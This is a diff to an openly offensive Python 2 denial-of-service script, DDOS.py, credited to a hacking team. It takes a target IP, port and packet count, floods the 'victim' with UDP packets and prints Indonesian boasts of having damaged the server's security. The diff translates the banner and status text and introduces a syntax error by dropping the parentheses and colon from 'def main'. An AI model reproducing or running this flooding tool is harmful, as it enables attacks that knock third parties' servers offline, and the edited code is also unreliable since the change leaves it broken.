@@ -8,7 +8,7 @@ def usage():
     print "#-------------------------------------------------------#"
     print "#   \033[1;91mCommand: " "python2 DDOS.py " "<ip> <port> <packet> \033[1;32m   #"
     print "#                                                       #"
-    print "#\033[1;91mPembuat:MR.L4M3R  \033[1;32m##      ###       ##                #"
+    print "#\033[1;91mAuthor:MR.L4M3R  \033[1;32m##      ###       ##                #"
     print "#\033[1;91mTeam   : SUMBER CYBER TEAM        \033[1;32m##     #     NGERI:V     ##                #"
     print "#\033[1;91mVersion:1.0        \033[1;32m##      ###       ##                #"
     print "#                   ## \033[1;91m ##     \033[1;32m#  \033[1;91m##  \033[1;32m##                #"
@@ -34,8 +34,8 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print "\033[1;91mMengirim Serangan \033[1;32m%s \033[1;91mPaket Berhasil Terkirim  \033[1;32m%s \033[1;91mPaket Berhasil Terkirim \033[1;32m%s "%(sent, victim, vport)
-def main():
+        print "\033[1;91mMengirim Serangan Ke Server \033[1;32m%s \033[1;91mPaket Berhasil Terkirim Ke Alamat IP  \033[1;32m%s \033[1;91mBerhasil Merusak Keamanan Server \033[1;32m%s "%(sent, victim, vport)
+def main
     if len(sys.argv) != 4:
         usage()
     else:
